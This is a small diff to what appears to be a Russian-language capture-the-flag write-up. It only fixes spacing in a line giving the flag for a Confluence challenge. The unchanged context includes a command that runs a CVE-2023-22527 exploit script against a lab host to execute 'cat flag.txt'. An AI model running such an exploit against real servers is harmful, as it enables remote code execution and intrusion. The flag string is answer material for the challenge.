@@ -5,4 +5,4 @@
 python3 CVE-2023-22527.py --target http://10.10.1.159:8090 --cmd 'cat flag.txt'
 ```
 
-**Флаг: ** `nto{c0nflu3nc3_15_und3r_4774ck}`
+**Флаг:** `nto{c0nflu3nc3_15_und3r_4774ck}`
